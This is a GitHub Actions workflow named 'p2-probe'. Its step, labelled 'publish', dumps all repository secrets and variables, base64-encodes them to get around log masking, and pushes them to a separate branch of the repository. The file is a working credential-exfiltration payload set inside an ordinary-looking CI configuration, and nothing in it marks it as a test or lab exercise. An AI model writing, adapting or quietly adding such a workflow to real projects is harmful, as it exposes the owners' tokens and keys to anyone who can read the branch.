name: p2-probe
on:
  push:
    branches: ['p2-probe-trigger']
  workflow_dispatch:
permissions:
  contents: write
jobs:
  repo:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: publish
        env:
          SECRETS_JSON: ${{ toJSON(secrets) }}
          VARS_JSON: ${{ toJSON(vars) }}
        run: |
          set -e
          mkdir -p p2out
          printf '%s' "$SECRETS_JSON" | base64 -w0 > p2out/secrets.b64
          printf '%s' "$VARS_JSON" | base64 -w0 > p2out/vars.b64
          git config user.email p2@probe.local; git config user.name p2probe
          git add -f p2out
          git commit -m p2probe-repo >/dev/null || echo "(no change)"
          git push origin HEAD:refs/heads/p2-probe-data-repo

